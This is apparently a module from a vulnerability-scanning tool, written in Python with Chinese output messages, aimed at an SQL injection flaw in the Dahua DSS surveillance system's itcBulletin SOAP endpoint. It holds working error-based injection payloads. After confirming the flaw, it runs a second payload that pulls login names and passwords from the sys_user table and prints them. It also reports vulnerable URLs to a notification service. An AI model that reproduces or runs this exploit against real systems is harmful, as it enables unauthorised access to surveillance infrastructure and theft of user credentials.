import re

from Common.Common_Request import common_request
from Modules.Configure import ServerJ


class Basic_information:
    no = 124,
    bugName = "大华DSS数字监控系统 itcBulletin SQL注入漏洞"


def scan_Dahua_DSS_system_itcBulletin_SQL_injection(url, proxies, append_to_output, serverJ_key, bugName):
    path = "/portal/services/itcBulletin?wsdl"
    headers = {
        'Accept-Encoding': 'gzip',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'text/xml;charset=UTF-8',
    }

    xml_payload1 = '''<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
          <s11:Body>
            <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
              <netMarkings>
                (updatexml(1,concat(0x7e,user(),0x7e),1))) and (1=1
              </netMarkings>
            </ns1:deleteBulletin>
          </s11:Body>
        </s11:Envelope>'''

    xml_payload2 = '''<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
                      <s11:Body>
                        <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
                          <netMarkings>
                            (updatexml(1,concat(0x7e,(select substr(group_concat(login_name, " ",login_pass),1,30) from sys_user),0x7e),1))) and (1=1
                          </netMarkings>
                        </ns1:deleteBulletin>
                      </s11:Body>
                    </s11:Envelope>'''

    response1 = common_request(url, path, headers, data=xml_payload1, method='POST', timeout=20, proxies=proxies,
                               append_to_output=append_to_output)
    if response1 is not None:
        if response1.status_code == 500 and 'XPATH' in response1.text:
            append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
            ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ", ServerJ_Key=serverJ_key)

            response2 = common_request(url, path, headers, data=xml_payload2, method='POST', timeout=20,
                                       proxies=proxies, append_to_output=append_to_output)
            if response2 is not None:
                if response2.status_code == 500 and 'XPATH' in response2.text:
                    pattern = r'~(.*?)~'  # 使用正则表达式模式匹配 ~ 之间的内容
                    matches = re.findall(pattern, response2.text)

                    if matches:
                        first_match = matches[0]
                        append_to_output(f"发现账号密码为 ： {first_match}", "yellow")  # 输出第一个匹配项
                    else:
                        append_to_output("No matches found.")
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
